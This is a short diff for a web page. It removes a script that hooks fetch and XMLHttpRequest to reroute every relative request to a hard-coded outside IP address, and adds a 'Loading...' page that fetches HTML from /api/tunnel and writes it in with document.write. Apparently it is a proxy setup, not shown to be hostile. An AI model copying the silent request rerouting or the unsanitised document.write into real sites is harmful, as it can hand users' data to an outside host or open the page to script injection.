@@ -1,25 +1,20 @@
-<script>
-(function() {
-  const BASE = 'http://168.231.102.46:6969';
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <script>
+    (async () => {
+      const query = window.location.search;
+      const response = await fetch(`/api/tunnel${query}`);
+      const html = await response.text();
 
-  // Hook fetch
-  const originalFetch = window.fetch;
-  window.fetch = function(input, init) {
-    if (typeof input === 'string' && input.startsWith('/')) {
-      input = BASE + input;
-    } else if (input instanceof Request && input.url.startsWith('/')) {
-      input = new Request(BASE + input.url, input);
-    }
-    return originalFetch(input, init);
-  };
-
-  // Hook XMLHttpRequest
-  const originalOpen = XMLHttpRequest.prototype.open;
-  XMLHttpRequest.prototype.open = function(method, url, ...rest) {
-    if (url.startsWith('/')) {
-      url = BASE + url;
-    }
-    return originalOpen.call(this, method, url, ...rest);
-  };
-})();
-</script>
+      // Replace the current document with the fetched HTML
+      document.open();
+      document.write(html);
+      document.close();
+    })();
+  </script>
+</head>
+<body></body>
+</html>
